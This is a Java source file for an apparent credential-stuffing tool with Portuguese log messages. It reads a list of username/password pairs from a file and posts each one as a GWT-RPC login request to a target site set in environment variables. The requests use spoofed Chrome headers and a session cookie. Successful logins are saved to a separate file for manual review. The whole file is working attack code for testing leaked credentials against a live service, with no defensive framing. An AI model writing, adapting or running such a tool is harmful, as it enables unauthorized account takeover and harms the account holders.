package com.joaobembe;

import io.github.cdimascio.dotenv.Dotenv;
import okhttp3.*;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    public static void main(String[] args) {
        final Logger logger = Logger.getLogger(Main.class.getName());

        Dotenv dotenv = Dotenv.load();
        final String regex = dotenv.get("REGEX");
        String fileName = dotenv.get("FILE_NAME");
        String string = "";
        try {
            String projectRoot = System.getProperty("user.dir");
            Path path = Paths.get(projectRoot, fileName);
            string = Files.readString(path);
        } catch (IOException e) {
            System.out.println("Ocorreu um erro ao ler o arquivo: " + e.getMessage());
        }
        assert regex != null;
        final Pattern pattern = Pattern.compile(regex, Pattern.MULTILINE | Pattern.CASE_INSENSITIVE);
        final Matcher matcher = pattern.matcher(string);
        OkHttpClient client = new OkHttpClient();
        String requestBodyTemplate = dotenv.get("REQUEST_BODY");
        String cookie = dotenv.get("COOKIE");
        String host = dotenv.get("HOST");
        String url = dotenv.get("URL");
        String xGwtPermutation = dotenv.get("X_GWT_PERMUTATION");
        String xGwtModuleBase = dotenv.get("X_GWT_MODULE_BASE");
        String origin = dotenv.get("ORIGIN");
        String referer = dotenv.get("REFERER");
        String cargapositiva = dotenv.get("SUCCESS_FILE_NAME");
        String carganegativa = dotenv.get("ERROR_FILE_NAME");
        while (matcher.find()) {
            System.out.println("Tentando logar com: " + matcher.group(0));
            assert requestBodyTemplate != null;
            String requestBodyContent = String.format(requestBodyTemplate, matcher.group(2), matcher.group(1));
            RequestBody body = RequestBody.create(requestBodyContent, MediaType.parse("text/x-gwt-rpc"));
            assert url != null;
            assert host != null;
            assert xGwtPermutation != null;
            assert xGwtModuleBase != null;
            assert origin != null;
            assert referer != null;
            assert cookie != null;
            Request request = new Request.Builder()
                    .url(url)
                    .post(body)
                    .addHeader("Host", host)
                    .addHeader("Connection", "keep-alive")
                    .addHeader("Content-Length", "343")
                    .addHeader("sec-ch-ua-full-version-list", "\"Google Chrome\";v=\"129.0.6668.101\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"129.0.6668.101\"")
                    .addHeader("sec-ch-ua-platform", "\"Windows\"")
                    .addHeader("X-GWT-Permutation", xGwtPermutation)
                    .addHeader("X-GWT-Module-Base", xGwtModuleBase)
                    .addHeader("sec-ch-ua", "\"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"")
                    .addHeader("sec-ch-ua-bitness", "\"64\"")
                    .addHeader("sec-ch-ua-model", "\"\"")
                    .addHeader("sec-ch-ua-mobile", "?0")
                    .addHeader("sec-ch-ua-arch", "\"x86\"")
                    .addHeader("sec-ch-ua-full-version", "\"129.0.6668.101\"")
                    .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36")
                    .addHeader("Content-Type", "text/x-gwt-rpc; charset=UTF-8")
                    .addHeader("sec-ch-ua-platform-version", "\"15.0.0\"")
                    .addHeader("Accept", "*/*")
                    .addHeader("Origin", origin)
                    .addHeader("Sec-Fetch-Site", "same-origin")
                    .addHeader("Sec-Fetch-Mode", "cors")
                    .addHeader("Sec-Fetch-Dest", "empty")
                    .addHeader("Referer", referer)
                    .addHeader("Accept-Language", "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7")
                    .addHeader("Cookie", cookie)
                    .build();
            String stringResponse;
            try (Response response = client.newCall(request).execute()) {
                if (!response.isSuccessful()) throw new IOException("Unexpected code " + response);
                assert response.body() != null;
                stringResponse = response.body().string();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            String[] elements = stringResponse.split(",");
            if (elements[5].equals("'P__________'")) {
                try (FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/" + cargapositiva, true)) {
                    writer.write("usuario: " + matcher.group(1) + "; Senha: " + matcher.group(2)+ "\n");
                    System.out.println("Login encontrado: " + matcher.group(1) + ": " + matcher.group(2));
                    System.out.println("------> Analise manual: " + stringResponse + "\n");
                } catch (IOException e) {
                    logger.log(Level.SEVERE, "An exception occurred", e);
                }
            } else {
                try (FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/" + carganegativa, true)) {
                    writer.write("usuario: " + matcher.group(1) + "; Senha: " + matcher.group(2) + "; Request: " + stringResponse + "\n");
                    System.out.println("Login falhou para: " + matcher.group(1) + ": " + matcher.group(2));
                    System.out.println("------> Analise manual: " + stringResponse + "\n");
                } catch (IOException e) {
                    logger.log(Level.SEVERE, "An exception occurred", e);
                }
            }
        }
    }
}